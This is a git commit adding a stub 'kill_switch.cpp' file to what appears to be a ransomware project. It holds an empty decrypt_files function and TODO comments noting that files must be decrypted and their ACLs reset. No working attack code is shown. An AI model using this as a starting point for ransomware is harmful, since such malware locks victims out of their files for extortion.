eff3edb3024302eef7bde1c3eda29933d540be17
ryancor <ryan_cornateanu@yahoo.com>
2018-08-30 11:30:53 -0700

    kill switch function to be vector

---
+++ ransomware/ransomware/kill_switch.cpp
@@ -0,0 +1,9 @@
+#include "kill_switch.h"
+
+vector<wstring> decrypt_files(wstring path)
+{
+	vector<wstring> subdirs, matches;
+	// TODO: finish the decrypting of files
+	// TODO: Must reset ACLs before files can be opened again.
+	return matches;
+}
